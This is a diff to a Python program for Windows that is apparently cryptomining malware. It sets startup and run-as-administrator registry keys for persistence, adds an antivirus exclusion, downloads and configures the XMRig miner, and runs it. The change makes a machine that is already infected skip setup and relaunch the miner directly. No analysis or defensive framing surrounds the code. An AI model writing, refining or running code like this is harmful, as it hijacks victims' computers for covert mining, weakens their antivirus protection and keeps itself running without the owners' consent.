@@ -28,7 +28,10 @@ def get_persistance_and_priv():
             value, regtype = reg.QueryValueEx(reg_key, f"{app_name}_RunAsAdmin")
             reg.CloseKey(reg_key)
 
-            print(f"{app_name} is already set to run on startup and as administrator.")
+            print(f"{app_name} is already set to run on startup and as administrator")
+            print(f"{app_name} has already been set up on pc, running xmrig.exe")
+            # If the app has already been set up on the pc, then just run xmrig.exe
+            return "is-setup"
         except FileNotFoundError:
             try:
                 # If the registry key doesn't exist, create it
@@ -65,7 +68,7 @@ def get_av_exclusion():
     except:
         return
 
-def edit_xmrig_config(xmr_address:str):
+def edit_xmrig_config():
     # Get the file path, and take the [0] index of the xmrig_version_name since it would be equal to the only available file in the dir
     xmrig_config = os.path.expandvars(f"{xmrig_download_path}\\xmrig\\{xmrig_version_name}\\config.json")
 
@@ -107,23 +110,27 @@ def edit_xmrig_config(xmr_address:str):
 def run_xmrig():
     # Get the executable and config file, for the xmrig command
     xmrig_executable = os.path.join(xmrig_download_path, f"xmrig\\{xmrig_version_name}\\xmrig.exe")
-    xmrig_config = os.path.join(xmrig_download_path, f"xmrig\\{xmrig_version_name}\\config.json")
+    #xmrig_config = os.path.join(xmrig_download_path, f"xmrig\\{xmrig_version_name}\\config.json")
 
     # Construct xmrig command
     try:
-        subprocess.run(f"{xmrig_executable} -c {xmrig_config}")
-    except:
-        sys.exit()
+        print(f"Running xmrig from: {xmrig_executable}")
+        subprocess.run(f"{xmrig_executable}", shell=True)
+    except Exception as e:
+        print(f"Error: {e}")
 
 def main():
     if os.name != "nt":
         return
     
-    get_persistance_and_priv()
-    get_xmrig()
-    get_av_exclusion()
-    edit_xmrig_config()
-    run_xmrig()
+    if get_persistance_and_priv() == "is-setup":
+        run_xmrig()
+        return
+    else:
+        get_xmrig()
+        get_av_exclusion()
+        edit_xmrig_config()
+        run_xmrig()
 
 if __name__ == "__main__":
     main()
